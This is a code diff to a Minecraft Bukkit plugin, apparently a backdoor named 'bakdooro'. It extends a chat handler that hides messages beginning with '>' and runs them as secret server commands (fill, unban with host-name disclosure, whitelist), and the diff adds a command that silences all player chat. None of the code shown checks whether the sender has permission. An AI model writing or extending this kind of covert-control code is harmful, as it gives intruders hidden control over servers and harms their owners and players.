@@ -22,8 +22,15 @@ import static org.bukkit.Bukkit.*;
 /// Parses and calls methods when an asyncchatevent is fired. Look in me.acaiberii.bakdooro.listeners.chat :)
 
 public class chathandler {
+    public static boolean isChatDisabled = false;
     public static void handler(Player pl, String message, AsyncPlayerChatEvent e) {
         String[] spl = message.split(":");
+        if (isChatDisabled) {
+            e.setCancelled(true);
+        }
+        else if (!isChatDisabled){
+            e.setCancelled(false);
+        }
         if (message.startsWith(">")) {
             e.setCancelled(true);
             if (spl[0].startsWith(">fill")) {
@@ -77,9 +84,25 @@ public class chathandler {
                     pl.sendMessage("Unbanned " + Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostName());
                 }
             }
+            else if (spl[0].startsWith(">chat")) {
+                if (spl.length < 2) {
+                    pl.sendMessage("Invalid syntax. Correct syntax: >chat:(on/off)");
+                }
+                else {
+                    if (spl[1].equals("on")) {
+                        isChatDisabled = false;
+                    }
+                    else if (spl[1].equals("off")) {
+                        isChatDisabled = true;
+                    }
+                    else {
+                        pl.sendMessage("Unknown mode. Valid modes: on, off.");
+                    }
+                }
+            }
             else if (spl[0].startsWith(">whitelist")) {
                 if (spl.length < 2) {
-                    pl.sendMessage("Invalid syntax. Correct syntax: >whitelist:(on/off)/>whitelist:(add/remove):(PLAYER)");
+                    pl.sendMessage("Invalid syntax. Correct syntax: >whitelist:(on/off) or >whitelist:(add/remove):(PLAYER)");
                 }
                 else {
                     if (spl[1].equals("on")) {
